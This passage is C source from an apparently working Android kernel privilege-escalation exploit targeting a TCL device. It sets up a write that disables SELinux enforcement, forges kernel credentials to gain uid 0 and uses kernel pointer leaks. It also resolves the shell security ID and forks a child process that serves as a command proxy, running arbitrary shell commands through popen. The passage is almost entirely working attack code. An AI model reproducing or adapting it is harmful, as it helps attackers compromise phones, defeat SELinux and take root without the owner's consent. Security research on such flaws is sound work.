       * the state itself and/or the avc partner among the leak
       * candidates confirms the device-derived target; seeing NEITHER
       * is a warning but not a blocker (the pread-storm sampling is
       * noisy). The consumer's enforce readback after round 1 is the
       * authoritative verification. */
      uintptr_t sel_cands[MAX_SEL_CANDS];
      int nsel = perf_leak_selinux_state(sel_cands);
      int have_state = -1, have_avc = -1;
      for (int i = 0; i < nsel; i++) {
        if (sel_cands[i] == g_selinux_target) have_state = i;
        if (sel_cands[i] == g_selinux_target - 0x1828ULL) have_avc = i;
      }
      pr_info("selinux target %016lx (device table anchor+%016lx); "
              "leak: state=%d avc(pair-0x1828)=%d%s\n",
              (unsigned long)g_selinux_target,
              (unsigned long)active_offsets->off_selinux_enforcing_device,
              have_state, have_avc,
              (have_state >= 0 || have_avc >= 0)
                  ? " - PAIR AGREEMENT"
                  : " (no pair candidates sampled; enforce readback will verify)");
      uintptr_t symbol_base = runtime_static_symbol_base();
      int preserve_initialized =
          env_flag("GHOST_SELINUX_PRESERVE_INIT", 1);
      g_selinux_stamp_value = 0;
      if (preserve_initialized) {
        uintptr_t wake_start = symbol_base +
                               TCL_V643_NON_IRQ_WAKE_REASON_OFF;
        uintptr_t wake_end = wake_start +
                             TCL_V643_NON_IRQ_WAKE_REASON_SIZE;
        uintptr_t stamp = symbol_base +
                          TCL_V643_SELINUX_STAMP_PARENT_OFF;
        const unsigned char *stamp_bytes =
            (const unsigned char *)&stamp;
        if (stamp < wake_start || stamp + 16 > wake_end ||
            stamp_bytes[0] != 0 || stamp_bytes[1] != 0 ||
            stamp_bytes[2] == 0) {
          g_selinux_target = 0;
          pr_warning("SELinux preserving write NOT armed: stamp geometry "
                     "failed (stamp=%016lx wake=%016lx..%016lx)\n",
                     (unsigned long)stamp, (unsigned long)wake_start,
                     (unsigned long)wake_end);
          preserve_initialized = 0;
        } else {
          g_selinux_stamp_value = stamp;
          pr_info("SELinux preserving stamp=%016lx bytes=%02x,%02x,%02x; "
                  "policycap reload required; +8 collateral confined to "
                  "non_irq_wake_reason\n",
                  (unsigned long)stamp, stamp_bytes[0], stamp_bytes[1],
                  stamp_bytes[2]);
        }
      }
      if (!g_selinux_target) {
        pr_warning("SELinux mode disabled after preserving-write gate\n");
      } else {
        selinux_mode = 1;
        g_selinux_write_armed = 1;
        pr_info("mode 7 armed: plan0 selinux %s, plan1 cred, "
                "plan2 real_cred\n",
                g_selinux_stamp_value ? "preserve-initialized" : "zero");
      }
    } else {
      g_selinux_target = 0;
      pr_warning("selinux write NOT armed (bad derived target) - "
                 "falling back to mode 6\n");
    }
  } else if (!env_flag("GHOST_SELINUX", 1)) {
    pr_info("GHOST_SELINUX=0 - mode 6 (cred swap only)\n");
  }

  /* Shared-memory relay: fork a child that survives the exploit and
   * provides a fallback command proxy. The main thread (post-cred-swap)
   * has uid=0 but kernel SID -> no file I/O. The child has original
   * shell creds (uid=2000, shell SELinux context) and CAN do I/O.
   *
   * Protocol (two-phase):
   *   Phase 1: parent writes relay data, sets ready=1.
   *            Child writes relay data to file + stdout.
   *   Phase 2: parent writes shell commands to cmd[], sets cmd_ready=1.
   *            Child executes them, writes output to resp[], sets resp_ready=1.
   *            Parent reads resp and writes to relay for disk output.
   *
   * The child NEVER exits - it loops serving commands until parent
   * sets cmd[] = "EXIT" or closes the relay. */
  struct shmem_relay {
    volatile int ready;       /* phase 1: relay data ready */
    volatile int len;         /* bytes of relay payload */
    volatile int cmd_ready;   /* phase 2: parent wrote a command */
    volatile int cmd_len;     /* length of command (0 = no cmd) */
    volatile int resp_ready;  /* child wrote response */
    volatile int resp_len;    /* length of response */
    char data[16384];         /* relay data + command + response overlay */
    /* data layout: [0..8191] = relay payload
     *              [8192..12287] = command (4KB)
     *              [12288..16383] = response (4KB) */
    volatile uint32_t child_sid_cached; /* shell SID loaded from
                                         * .gl_sid_cache (0 = none) */
    char child_ctx[128];      /* child's SELinux context string */
    char child_fp[160];       /* ro.build.fingerprint at fork time */
    volatile int child_ready; /* Phase 0 fully published */
    int child_ngrps;          /* supplementary group count */
    uint32_t child_grps[16];  /* supplementary gids (unsorted) */
  };
  #define RELAY_DATA_MAX 8192
  /* Shell-SID cache: the SID table is built at policy load, and the
   * policy ships with the build -- so a discovered shell SID is stable
   * across boots of the same fingerprint. The child loads it pre-exploit
   * and the parent verifies it live (one readback) before trusting it. */
  #define GL_SID_CACHE_PATH "/data/local/tmp/.gl_sid_cache"
  #define GL_SID_CACHE_TAG  "GL_SID_CACHE "
  /* probe file the child pre-creates for the parent's faccessat scan */
  #define GL_SID_PROBE_PATH "/data/local/tmp/.gl_probe"
  #define RELAY_CMD_OFF  8192
  #define RELAY_CMD_MAX  4096
  #define RELAY_RESP_OFF 12288
  #define RELAY_RESP_MAX 4096
  struct shmem_relay *relay = mmap(NULL, sizeof(*relay),
      PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
  pid_t relay_child_pid = 0;
  if (relay != MAP_FAILED) {
    relay->ready = 0;
    relay->len = 0;
    relay->cmd_ready = 0;
    relay->cmd_len = 0;
    relay->resp_ready = 0;
    relay->resp_len = 0;
    relay_child_pid = fork();
    if (relay_child_pid == 0) {
      /* ==== RELAY CHILD: original shell creds, CAN do file I/O ==== */
      /* Phase 0: publish shell-SID info to the parent BEFORE the exploit
       * runs, so the parent never needs the old 32K-SID openat storm:
       *   - own context string (the verification target for any SID)
       *   - ro.build.fingerprint (cache invalidation key: the SELinux
       *     policy -- and thus the SID table -- ships with the build)
       *   - the cached shell SID persisted by a previous successful run
       *     (SID assignment is stable across boots for a given policy)
       * Also pre-creates the probe file the parent's bounded fallback
       * scan touches via faccessat (one syscall per trial, no fds).
       * NOTE: there is NO userspace API for the numeric SID itself --
       * the selinuxfs `context` file round-trips context STRINGS (and
       * its write is denied for the shell domain on this device), so
       * the cache + live verification is the only reliable path. */
      uint32_t child_sid_cached = 0;
      char child_ctx[128] = {0};
      char child_fp[PROP_VALUE_MAX] = {0};
      int child_ngrps = 0;
      gid_t child_grps[16] = {0};
      {
        int af = open("/proc/self/attr/current", O_RDONLY);
        if (af >= 0) {
          int n = (int)read(af, child_ctx, sizeof(child_ctx)-1);
          close(af);
          if (n > 0) {
            child_ctx[n] = 0;
            while (n > 0 && (child_ctx[n-1] == '\n' || child_ctx[n-1] == 0))
              child_ctx[--n] = 0;
          }
        }
        __system_property_get("ro.build.fingerprint", child_fp);
        /* Supplementary groups: the fake cred's group_info is built from
         * these. They fix post-root DAC on shell-owned objects (uid 0 is
         * "other" on /data/local/tmp's drwxrwx--x) and /proc visibility
         * (hidepid=invisible,gid=3009). */
        {
          int nq = getgroups(0, NULL);
          gid_t gl[16];
          if (nq > 16) nq = 16;
          if (nq > 0) nq = getgroups(nq, gl);
          if (nq > 0) {
            child_ngrps = nq;
            for (int i = 0; i < nq; i++) child_grps[i] = gl[i];
          }
        }
        int pf = open(GL_SID_PROBE_PATH, O_WRONLY|O_CREAT|O_TRUNC, 0666);
        if (pf >= 0) { write(pf, "gl", 2); close(pf); }
        /* Load the cached shell SID. Cache file format (one line):
         *   GL_SID_CACHE FP=<fingerprint> SID=<n> CTX=<context>
         * Trust it only when fingerprint AND context match this boot:
         * an OTA changes the policy and moves every SID. */
        int cf = open(GL_SID_CACHE_PATH, O_RDONLY);
        if (cf >= 0) {
          char cbuf[512] = {0};
          int cn = (int)read(cf, cbuf, sizeof(cbuf)-1);
          close(cf);
          if (cn > 0) {
            cbuf[cn] = 0;
            uint32_t csid = 0;
            char cctx[128] = {0};
            char cfp[PROP_VALUE_MAX] = {0};
            char *line = cbuf;
            while (*line) {
              char *eol = line;
              while (*eol && *eol != '\n') eol++;
              char saved = *eol;
              *eol = 0;
              if (strncmp(line, GL_SID_CACHE_TAG,
                          strlen(GL_SID_CACHE_TAG)) == 0) {
                char *p = line + strlen(GL_SID_CACHE_TAG);
                while (*p) {
                  if (strncmp(p, "FP=", 3) == 0) {
                    char *v = p + 3; char *o = cfp;
                    while (*v && *v != ' ' &&
                           (long)(o - cfp) < (long)sizeof(cfp)-1) *o++ = *v++;
                    *o = 0; p = v;
                  } else if (strncmp(p, "SID=", 4) == 0) {
                    p += 4;
                    unsigned long acc = 0;
                    while (*p >= '0' && *p <= '9') {
                      acc = acc*10 + (unsigned long)(*p - '0'); p++;
                    }
                    csid = (uint32_t)acc;
                  } else if (strncmp(p, "CTX=", 4) == 0) {
                    char *v = p + 4; char *o = cctx;
                    while (*v && *v != ' ' &&
                           (long)(o - cctx) < (long)sizeof(cctx)-1) *o++ = *v++;
                    *o = 0; p = v;
                  } else {
                    p++;
                  }
                  while (*p == ' ') p++;
                }
              }
              if (!saved) break;
              line = eol + 1;
            }
            int fp_ok = (cfp[0] == 0) || strcmp(cfp, child_fp) == 0;
            int ctx_ok = (cctx[0] == 0) || strcmp(cctx, child_ctx) == 0;
            if (csid > 0 && fp_ok && ctx_ok) child_sid_cached = csid;
          }
        }
      }
      /* Publish to the parent (it reads these only after the walks,
       * long after this point -- the fence is belt-and-braces). */
      if (relay != MAP_FAILED) {
        relay->child_sid_cached = child_sid_cached;
        snprintf(relay->child_ctx, sizeof(relay->child_ctx), "%s", child_ctx);
        snprintf(relay->child_fp, sizeof(relay->child_fp), "%s", child_fp);
        relay->child_ngrps = child_ngrps;
        for (int i = 0; i < child_ngrps && i < 16; i++)
          relay->child_grps[i] = (uint32_t)child_grps[i];
        __atomic_thread_fence(__ATOMIC_SEQ_CST);
        relay->child_ready = 1;
      }
      /* Phase 1: wait for relay data, dump to file + stdout. The wait
       * must outlast a full multi-attempt run (each reclaim round is
       * ~40s; CRED_ATTEMPTS up to 6) - the old 60s window expired mid-
       * run on slow boots and the payload was never dumped. */
      __atomic_thread_fence(__ATOMIC_SEQ_CST);
      for (int w = 0; w < 6000 && !relay->ready; w++)
        usleep(100000);
      if (relay->ready == 99) _exit(0);
      if (relay->ready && relay->len > 0) {
        char pre[512];
        int pl = snprintf(pre, sizeof(pre),
          "CHILD_CTX=%s CACHED_SID=%u FP=%s\n",
          child_ctx, child_sid_cached, child_fp);
        int rf = open("/data/local/tmp/gl2_relay.txt",
                      O_WRONLY|O_CREAT|O_TRUNC, 0644);
        if (rf >= 0) {
          write(rf, pre, pl);
          write(rf, relay->data, relay->len);
          close(rf);
        }
        write(1, pre, pl);
        write(1, relay->data, relay->len);
        fsync(1);
        /* Persist the "GL_SID_CACHE ..." marker line the parent appended
         * to the payload, so the next run can skip the SID scan. */
        {
          char *base = relay->data;
          int len = relay->len;
          int taglen = (int)strlen(GL_SID_CACHE_TAG);
          int pos = 0;
          while (pos < len) {
            int eol = pos;
            while (eol < len && base[eol] != '\n') eol++;
            if (eol - pos > taglen &&
                memcmp(base + pos, GL_SID_CACHE_TAG, (size_t)taglen) == 0) {
              int wf = open(GL_SID_CACHE_PATH,
                            O_WRONLY|O_CREAT|O_TRUNC, 0644);
              if (wf >= 0) {
                write(wf, base + pos, (size_t)(eol - pos));
                write(wf, "\n", 1);
                close(wf);
              }
            }
            pos = eol + 1;
          }
        }
      }
      /* Phase 2: command proxy loop. Parent writes commands into
       * data[RELAY_CMD_OFF..], sets cmd_len and cmd_ready=1.
       * Child executes, writes output to data[RELAY_RESP_OFF..],
       * sets resp_len and resp_ready=1. Exit on "EXIT" command. */
      relay->cmd_ready = 0;
      relay->cmd_len = 0;
      relay->resp_ready = 0;
      relay->resp_len = 0;
      __atomic_thread_fence(__ATOMIC_SEQ_CST);
      for (;;) {
        /* Poll for commands (100ms) */
        if (relay->cmd_ready && relay->cmd_len > 0 &&
            relay->cmd_len < RELAY_CMD_MAX) {
          char *cmd = relay->data + RELAY_CMD_OFF;
          cmd[relay->cmd_len] = '\0';
          /* Check for exit signal */
          if (cmd[0] == 'E' && cmd[1] == 'X' && cmd[2] == 'I' &&
              cmd[3] == 'T' && cmd[4] == '\0') {
            relay->resp_len = 0;
            relay->resp_ready = 1;
            break;
          }
          /* Execute command via popen and capture output */
          char *resp = relay->data + RELAY_RESP_OFF;
          int rl = 0;
          /* Prefix: show what we ran */
          #define CHILD_APPEND(s) do { \
            const char *_cs = (s); int _cl = 0; \
            while (_cs[_cl]) _cl++; \
            if (rl + _cl < RELAY_RESP_MAX - 1) { \
              for (int _cj = 0; _cj < _cl; _cj++) resp[rl++] = _cs[_cj]; \
            } \
          } while(0)
          CHILD_APPEND("$ "); CHILD_APPEND(cmd); CHILD_APPEND("\n");
          FILE *fp = popen(cmd, "r");
          if (fp) {
            char buf[1024];
            while (fgets(buf, sizeof(buf), fp) &&
                   rl < RELAY_RESP_MAX - 128) {
              for (int ci = 0; buf[ci] && rl < RELAY_RESP_MAX - 2; ci++)
                resp[rl++] = buf[ci];
            }
            int rc = pclose(fp);
            if (rc != 0 && rl < RELAY_RESP_MAX - 32) {
              CHILD_APPEND("[exit=");
              char ec[16]; int ecl = 0; int ev = WEXITSTATUS(rc);
              if (ev == 0) ec[ecl++] = '0';
              else { char t[8]; int ti = 0;
                while (ev) { t[ti++] = '0' + ev % 10; ev /= 10; }
                while (ti) ec[ecl++] = t[--ti]; }
              for (int cj = 0; cj < ecl; cj++) resp[rl++] = ec[cj];
              CHILD_APPEND("]");
            }
          } else {
            CHILD_APPEND("popen failed: ");
            char *es = strerror(errno);
            if (es) CHILD_APPEND(es);
          }
          CHILD_APPEND("\n");
          resp[rl] = '\0';
          #undef CHILD_APPEND
          relay->resp_len = rl;
          __atomic_thread_fence(__ATOMIC_SEQ_CST);
          relay->resp_ready = 1;
          relay->cmd_ready = 0;
          relay->cmd_len = 0;
        }
        usleep(100000);
        /* Also check if parent died (relay page became invalid) */
        if (relay->ready == 99) break; /* exit signal from parent */
      }
      _exit(0);
    }
    /* Parent continues with exploit */
  }

  /* Leak cred->security pointer so fake_cred reuses the real shell
   * security blob. Without this, the fake blob has kernel SID and
   * security_file_permission blocks all post-root file I/O. */
  if (!g_leaked_security_ptr) {
    uintptr_t sec = perf_leak_cred_security(g_leaked_task);
    if (sec) {
      g_leaked_security_ptr = sec;
      pr_info("fake_cred->security = %016lx (real shell blob)\n",
              (unsigned long)sec);
    } else {
      pr_warning("security leak failed, using fake blob (kernel SID)\n");
    }
  }

  /* Consume the child's Phase-0 publication: the supplementary groups
   * are baked into the fake cred's group_info BEFORE the payload is
   * built (prepare_skb_payload -> fill_fake_cred_suite reads them). */
  {
    /* Fallback: the standard adb-shell supplementary set (covers the
     * DAC group 2000 and the hidepid-exempt gid 3009). */
    static const uint32_t fb[] = {1004, 1007, 1011, 1015, 1028, 1078,
                                  1079, 2000, 3001, 3002, 3003, 3006,
                                  3009, 3011, 3012};
    g_fake_ngrps = (int)(sizeof(fb) / sizeof(fb[0]));
    for (int i = 0; i < g_fake_ngrps; i++) g_fake_grps[i] = fb[i];
    if (relay != MAP_FAILED) {
      /* The child publishes in microseconds; bound the wait anyway. */
      for (int w = 0; w < 2000 && !relay->child_ready; w++) usleep(1000);
      __atomic_thread_fence(__ATOMIC_SEQ_CST);
      if (relay->child_ngrps > 0) {
        g_fake_ngrps = relay->child_ngrps > 16 ? 16 : relay->child_ngrps;
        for (int i = 0; i < g_fake_ngrps; i++)
          g_fake_grps[i] = relay->child_grps[i];
      }
    }
  }

  struct child_pipes root_victim_pipes;
  memset(&root_victim_pipes, 0, sizeof(root_victim_pipes));
  uintptr_t root_victim_task = 0;
  pid_t root_victim_pid = -1;
  if (direct_handoff_enabled) {
    if (!selinux_mode) {
      if (relay != MAP_FAILED) relay->ready = 99;
      pr_error("TCL safe handoff requires the verified SELinux cycle; "
               "refusing a broker exec under enforcing\n");
      return 1;
    }
  }

  /* SID resolution config (read NOW: post-walk code must not call libc
   * env/parse helpers). Preference order after root: cached SID from
   * .gl_sid_cache (child-loaded, live-verified) > GHOST_SID env override
   * > compiled default 1374 (device-proven) > bounded faccessat scan. */
  int sid_env_override = env_int_range("GHOST_SID", 0, 0, 32767);
  int sid_default = env_int_range("GHOST_SID_DEFAULT", 1374, 0, 32767);
  int sid_scan_max = env_int_range("GHOST_SID_MAX", 4096, 64, 32767);
  int sid_scan_enable = env_flag("GHOST_SID_SCAN", 1);
  g_settle_ms = env_int_range("GHOST_SETTLE_MS", 4000, 0, 30000);

  uint32_t uid_before = getuid();
  int ghost_exec = env_flag("GHOST_EXEC", 1);
  int ghost_probe = env_flag("GHOST_PROBE", 0); /* post-root DAC/SELinux bisection probes */
  int ghost_minimal = env_flag("GHOST_MINIMAL", 0); /* root proof without sensitive reads */
  int ghost_reboot = env_flag("GHOST_REBOOT", 0); /* volatile lab cleanup */
  int attempts = env_int_range("CRED_ATTEMPTS", 3, 1, 6);
  for (int att = 1; att <= attempts; att++) {
    pr_info("%s attempt %d/%d\n",
            selinux_mode ? "selinux+cred swap" : "cred swap", att, attempts);
    /* NOTE: no slab_drain here! Its 400-2000 unpinned fork+exit pairs churn
     * the mm cache's partial lists with MIXED pages (foreign live mms + free
     * slots) on every CPU - the leak child's mm then lands on such a page,
     * the choreography can never empty it, no discard happens and the walk
     * fires on the stale mm page (kernel panic). The sacrificial burst in
     * prepare_kernel_page handles the mixed-page draining instead. */
    if (env_flag("CRED_SLAB_DRAIN", 0))
      slab_drain();
    g_consumer_task = 0;
    /* TCL uses two independent one-erase cycles.  W2 runs first while
     * SELinux is still enforcing.  Once the victim verifies uid 0 it
     * unshares CLONE_FILES, preserving the W2 io_uring page in a private fd
     * table.  Only then does W1 open the bounded permissive window.  Thus a
     * W2 failure cannot leave SELinux permissive; after any possible W1
     * landing, only policy reload + verification or reboot may close it. */
    if (selinux_mode && active_offsets->reclaim_route ==
                            GHOST_RECLAIM_TCL_V643_EXACT) {
      if (root_victim_pid >= 0) {
        pr_error("TCL safe handoff does not retry reclaim with a live raw "
                 "victim; reboot is the cleanup boundary\n");
        return 1;
      }
      int victim_write = do_tcl_external_cred_write(
          &root_victim_pipes, &root_victim_pid, &root_victim_task,
          "victim cred swap");
      uint32_t early_uid = UINT32_MAX;
      int early_uid_read = 0;
      if (root_victim_pid >= 0 && root_victim_task)
        early_uid_read =
            tcl_victim_ping(&root_victim_pipes, root_victim_pid,
                            "post-write-ping") &&
            tcl_victim_uid(&root_victim_pipes, root_victim_pid, &early_uid,
                           "post-write-uid");
      if (!victim_write || !g_route_write_ok || root_victim_pid < 0 ||
          !root_victim_task || !early_uid_read || early_uid != 0) {
        if (root_victim_pid >= 0)
          tcl_victim_send(&root_victim_pipes, 'X');
        if (relay != MAP_FAILED) relay->ready = 99;
        pr_error("TCL safe handoff: W2 victim verification failed uid=%u\n",
                 early_uid);
        return 1;
      }
      if (!tcl_victim_unshare_files(&root_victim_pipes, root_victim_pid)) {
        tcl_victim_send(&root_victim_pipes, 'X');
        if (relay != MAP_FAILED) relay->ready = 99;
        pr_error("TCL safe handoff: victim could not pin W2 descriptors\n");
        return 1;
      }
      pr_success("TCL W2 verified before permissive window: victim pid=%d "
                 "task=%016lx parent_uid=%u\n", root_victim_pid,
                 (unsigned long)root_victim_task, (unsigned)getuid());

      if (!do_tcl_reuse_captured_write(
              g_selinux_target, g_selinux_stamp_value,
              g_selinux_stamp_value
                  ? "selinux preserve-initialized"
                  : "selinux zero",
              WRITE_MODE_CRED_SELINUX) ||
          !g_route_write_ok || !check_selinux_off()) {
        tcl_victim_send(&root_victim_pipes, 'X');
        if (relay != MAP_FAILED) relay->ready = 99;
        pr_error("TCL SELinux cycle failed; root victim will reboot if "
                 "the permissive write landed\n");
        return 1;
      }
      g_selinux_off = 1;
    } else {
      if (!do_one_write(selinux_mode ? g_selinux_target
                                     : g_leaked_task + TASK_CRED_OFF,
                        selinux_mode ? "selinux+cred swap" : "cred swap",
                        selinux_mode ? WRITE_MODE_CRED_SELINUX :
                                       WRITE_MODE_CRED))
        continue;
    }

  if (direct_handoff_enabled) {
      uint32_t victim_uid = UINT32_MAX;
      if (!g_route_write_ok ||
          !tcl_victim_uid(&root_victim_pipes, root_victim_pid, &victim_uid,
                          "pre-broker-uid") ||
          victim_uid != 0) {
        tcl_victim_send(&root_victim_pipes, 'X');
        if (relay != MAP_FAILED) relay->ready = 99;
        pr_error("TCL victim did not verify uid 0 after W1 (uid=%u); "
                 "reboot cleanup requested\n", victim_uid);
        return 1;
      }
      pr_success("TCL victim root verified; parent uid=%u remains unchanged\n",
                 (unsigned)getuid());
      uint32_t broker_pid = 0;
      if (!tcl_victim_word(&root_victim_pipes, root_victim_pid, 'G',
                           &broker_pid, "broker-start") ||
          !broker_pid) {
        pr_error("TCL safe handoff: normalized worker failed\n");
        return 1;
      }
      pr_success("TCL safe handoff: normalized %s pid=%u; raw victim "
                 "holds reclaim descriptors until handoff completes\n",
                 direct_resukisu_enabled ? "ReSukiSU loader" : "broker",
                 broker_pid);
      if (relay != MAP_FAILED) {
        __atomic_thread_fence(__ATOMIC_SEQ_CST);
        relay->ready = 99;
        __atomic_thread_fence(__ATOMIC_SEQ_CST);
      }
      return 0;
    }

    uint32_t uid_now = syscall(__NR_getuid);
    if (g_route_write_ok && (uid_now == 0 || uid_now == 0xffffff80u)) {
      /* ============ ROOT ACHIEVED - raw syscalls ONLY from here on ===== */
      int hits = atomic_load(&consumer_erase_hits);
      int plans = ghost_plan_count();

      /* ---- relay helpers: append to relay->data at relay->len (NEVER
       * reset relay->len - the later battery section appends to it). */
      #define RELAY_PUTC(c) do { \
        if (relay != MAP_FAILED && relay->len < (int)sizeof(relay->data) - 1) \
          relay->data[relay->len++] = (char)(c); \
      } while(0)
      #define RELAY_STR(s) do { \
        const char *_s = (s); int _l = 0; \
        while (_s[_l]) _l++; \
        if (relay != MAP_FAILED && relay->len + _l < (int)sizeof(relay->data) - 1) { \
          for (int _j = 0; _j < _l; _j++) relay->data[relay->len++] = _s[_j]; \
        } \
      } while(0)
      #define RELAY_DEC(v) do { \
        long _v = (long)(v); \
        if (_v < 0) { RELAY_PUTC('-'); _v = -_v; } \
        if (_v == 0) { RELAY_PUTC('0'); } \
        else { char _t[24]; int _i = 0; \
          while (_v) { _t[_i++] = '0' + (int)(_v % 10); _v /= 10; } \
          while (_i) RELAY_PUTC(_t[--_i]); \
        } \
      } while(0)
      #define RELAY_HEX(v) do { \
        static const char _h[] = "0123456789abcdef"; \
        RELAY_STR("0x"); \
        for (int _i = 0; _i < 16; _i++) \
          RELAY_PUTC(_h[((unsigned long long)(v) >> ((15 - _i) * 4)) & 0xf]); \
      } while(0)

      RELAY_STR("=== ROOT: uid=0 hits="); RELAY_DEC(hits);
      RELAY_STR("/"); RELAY_DEC(plans); RELAY_STR(" ===\n");
      int shell_spawned = 0;

      /* Crash-free SID resolution (replaces the 32K openat brute force
       * that panicked the device). fake_cred->security points at
       * FAKE_SEC_BLOB on the spray page; blob->sid (+4) is re-read by
       * the kernel on every SELinux hook, so current_sid() is steerable
       * through the uring mapping and verifiable with ONE readback of
       * /proc/self/attr/current (self-attr read takes no avc check).
       * Resolution order:
       *   1. selinux globally off (mode 7 walk 0 landed) -> no SID needed
       *   2. leaked real shell blob (g_leaked_security_ptr) -> verify once
       *   3. live candidates, each verified by a context readback:
       *      cached SID (child-loaded from .gl_sid_cache) > GHOST_SID
       *      env > compiled default 1374 (device-proven)
       *   4. bounded faccessat scan 2..GHOST_SID_MAX: ONE syscall per
       *      trial (no fd churn, no proc inodes), paced, verified hits.
       * Crash guard: if the blob readback does not track our writes
       * (page not the live security blob), the scan is skipped entirely
       * instead of storming syscalls at a dead blob. */
      {
        int found_sid = 0; /* >0: blob locked to this SID;
                            * -1: proceed without blob SID (selinux off /
                            *     leaked real blob verified) */
        const char *sid_how = "none";
        int hb = g_hit_block >= 0 ? g_hit_block : 0;
        uint8_t *hit_page = uring_block(hb);
        char child_ctx[128] = {0};
        char child_fp[160] = {0};
        uint32_t cached_sid = 0;
        if (relay != MAP_FAILED) {
          __atomic_thread_fence(__ATOMIC_SEQ_CST);
          cached_sid = relay->child_sid_cached;
          for (int i = 0; i < (int)sizeof(child_ctx)-1 && relay->child_ctx[i]; i++)
            child_ctx[i] = relay->child_ctx[i];
          for (int i = 0; i < (int)sizeof(child_fp)-1 && relay->child_fp[i]; i++)
            child_fp[i] = relay->child_fp[i];
        }
        RELAY_STR("sid: hit_block="); RELAY_DEC(hb);
        RELAY_STR(" uring_count="); RELAY_DEC(uring_count);
        RELAY_STR(" hit_page="); RELAY_HEX((uintptr_t)hit_page);
        RELAY_STR(" child_ctx="); RELAY_STR(child_ctx);
        RELAY_STR(" cached="); RELAY_DEC(cached_sid);
        RELAY_STR(" leaked_sec="); RELAY_HEX(g_leaked_security_ptr);
        RELAY_STR("\n");
        if (!hit_page) {
          RELAY_STR("sid: hit_page NULL - trying block 0\n");
          hit_page = uring_block(0);
        }

        if (g_selinux_off) {
          /* selinux_state zeroed (mode 7 walk 0): avc_denied() never
           * denies, so the SID value no longer matters for access. */
          RELAY_STR("sid: selinux OFF - no SID resolution needed\n");
          sid_how = "selinux-off";
          if (hit_page && cached_sid) blob_set_sid(hit_page, cached_sid);
          found_sid = -1;
        } else if (g_leaked_security_ptr) {
          /* fake_cred->security == the REAL shell blob: current_sid()
           * is the shell SID already. One readback to confirm (also
           * proves the swapped cred survives a SELinux hook). */
          char cb[128];
          long cn = sid_read_ctx(cb, sizeof(cb));
          if (cn > 0 && sid_ctx_is_shell(cb, cn, child_ctx)) {
            RELAY_STR("sid: leaked blob verified ctx=");
            RELAY_STR(cb); RELAY_STR("\n");
            sid_how = "leaked-blob";
            found_sid = -1;
          } else {
            RELAY_STR("sid: leaked blob readback MISMATCH (cn=");
            RELAY_DEC(cn);
            if (cn > 0) { RELAY_STR(" ctx="); RELAY_STR(cb); }
            RELAY_STR(") - leaked ptr is garbage; re-pointing "
                      "cred->security at the page blob\n");
            /* Recovery: the kernel re-reads cred->security on every
             * SELinux hook, so one aligned 8-byte store through the
             * uring mapping flips the process onto OUR blob (kernel
             * address page_base + FAKE_SEC_BLOB_OFF); the normal SID
             * resolution below then takes over. */
            if (page_base && hit_page) {
              *(volatile uint64_t *)(hit_page + FAKE_CRED_OFF +
                                     CRED15_SECURITY_OFF) =
                  (uint64_t)(page_base + SKB_DATA_DELTA + FAKE_SEC_BLOB_OFF);
              __atomic_thread_fence(__ATOMIC_SEQ_CST);
              g_leaked_security_ptr = 0;
              RELAY_STR("sid: cred->security -> ");
              RELAY_HEX(page_base + SKB_DATA_DELTA + FAKE_SEC_BLOB_OFF);
              RELAY_STR("\n");
            }
          }
        }

        if (!found_sid && !g_selinux_off && !g_leaked_security_ptr &&
            hit_page) {
          char cb[128];
          /* Candidate-first probe.  SID 1 maps to the kernel domain on the
           * TCL policy.  Although selinux_getprocattr itself can return the
           * current context without an AVC check, opening
           * /proc/self/attr/current still performs ordinary procfs path
           * traversal first.  kernel:s0 cannot search the shell-labelled
           * process directory, so using sid_read_ctx() as the initial
           * liveness oracle returns -EACCES for a perfectly live blob and
           * used to skip every candidate.
           *
           * Write only the bounded, preselected candidates first.  A
           * candidate must both access the relay child's pre-created
           * shell_data_file and then read back the exact original shell
           * context.  A false-positive access therefore cannot be accepted
           * as the shell SID.  Restore SID 1 before the legacy liveness/scan
           * path when none verifies. */
          uint32_t early_cands[3];
          int nearly = 0;
          if (cached_sid) early_cands[nearly++] = cached_sid;
          if (sid_env_override > 0)
            early_cands[nearly++] = (uint32_t)sid_env_override;
          if (sid_default > 0)
            early_cands[nearly++] = (uint32_t)sid_default;
          for (int ci = 0; ci < nearly && !found_sid; ci++) {
            uint32_t c = early_cands[ci];
            int dup = 0;
            for (int cj = 0; cj < ci; cj++)
              if (early_cands[cj] == c) dup = 1;
            if (dup) continue;
            blob_set_sid(hit_page, c);
            errno = 0;
            long ar = syscall(__NR_faccessat, AT_FDCWD,
                              GL_SID_PROBE_PATH, R_OK, 0);
            int ae = errno;
            long vn = -1;
            if (ar == 0) vn = sid_read_ctx(cb, sizeof(cb));
            if (ar == 0 && vn > 0 &&
                sid_ctx_is_shell(cb, vn, child_ctx)) {
              found_sid = (int)c;
              sid_how = (cached_sid && c == cached_sid) ? "cache-first"
                      : (sid_env_override > 0 &&
                         c == (uint32_t)sid_env_override)
                        ? "env-first" : "default-first";
              RELAY_STR("sid: EARLY CANDIDATE "); RELAY_DEC(c);
              RELAY_STR(" VERIFIED probe=0 ctx="); RELAY_STR(cb);
              RELAY_STR("\n");
            } else {
              RELAY_STR("sid: early candidate "); RELAY_DEC(c);
              RELAY_STR(" rejected (probe="); RELAY_DEC(ar);
              RELAY_STR(" errno="); RELAY_DEC(ae);
              RELAY_STR(" ctx_n="); RELAY_DEC(vn);
              if (vn > 0) { RELAY_STR(" ctx="); RELAY_STR(cb); }
              RELAY_STR(")\n");
            }
          }
          if (!found_sid) blob_set_sid(hit_page, 1);

          if (!found_sid) {
          /* Liveness probe: fill_fake_cred_suite initialized blob->sid=1
           * (kernel), so a live blob reads back u:r:kernel:s0 with no
           * writes from us. A mismatch means our page is not the blob
           * the kernel sees -> any scan would be a pointless storm. */
          long cn = sid_read_ctx(cb, sizeof(cb));
          int blob_live = (cn > 0 && sid_contains(cb, cn, "kernel"));
          RELAY_STR("sid: blob liveness cn="); RELAY_DEC(cn);
          if (cn > 0) { RELAY_STR(" ctx="); RELAY_STR(cb); }
          RELAY_STR(blob_live ? " -> LIVE\n"
                              : " -> NOT LIVE: scan skipped (crash guard)\n");

          /* Page r/w sanity (diagnostic) */
          volatile uint32_t *sec_sid =
              (volatile uint32_t *)(hit_page + FAKE_SEC_BLOB_OFF +
                                    TASK_SECURITY_SID_OFF);
          uint32_t before = *sec_sid;
          *sec_sid = 0xDEAD;
          __atomic_thread_fence(__ATOMIC_SEQ_CST);
          uint32_t after = *sec_sid;
          *sec_sid = before;
